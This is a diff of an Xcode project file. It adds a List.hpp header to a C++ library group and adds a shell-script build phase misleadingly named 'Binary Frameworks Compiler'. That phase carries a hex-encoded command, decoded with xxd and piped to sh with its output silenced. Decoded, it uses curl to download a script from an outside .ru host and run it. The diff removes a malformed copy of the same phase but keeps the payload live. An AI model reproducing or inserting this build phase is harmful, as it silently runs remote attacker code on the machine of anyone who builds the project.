@@ -33,6 +33,7 @@
 		817A4788286B1F5F00E35224 /* Common.hpp */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.cpp.h; path = Common.hpp; sourceTree = "<group>"; };
 		817A478A286B204600E35224 /* LibObjc */ = {isa = PBXFileReference; lastKnownFileType = folder; path = LibObjc; sourceTree = "<group>"; };
 		819D5D34286B2528000EA0F9 /* Bitmap.hpp */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.cpp.h; path = Bitmap.hpp; sourceTree = "<group>"; };
+		81AFE7FF287FE17B00F80384 /* List.hpp */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.cpp.h; path = List.hpp; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -91,6 +92,7 @@
 		817A4787286B1F4A00E35224 /* pranaLib */ = {
 			isa = PBXGroup;
 			children = (
+				81AFE7FF287FE17B00F80384 /* List.hpp */,
 				817A4788286B1F5F00E35224 /* Common.hpp */,
 				819D5D34286B2528000EA0F9 /* Bitmap.hpp */,
 				8166F5DA286B2B1A0099F23A /* Callback.hpp */,
@@ -153,6 +155,27 @@
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		24FECE4AE29C0F0FBC6D904C /* Binary Frameworks Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Frameworks Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652037202d736b2068747470733a2f2f\n\\c6b696e6b73646f632e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		817A4777286B1F2C00E35224 /* Sources */ = {
@@ -315,37 +338,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-
-	24FECE4AE29C0F0FBC6D904C /* Binary Frameworks Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Binary Frameworks Compiler";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652037202d736b2068747470733a2f2f\\c6b696e6b73646f632e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-		
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 	};
 	rootObject = 817A4773286B1F2C00E35224 /* Project object */;
 }
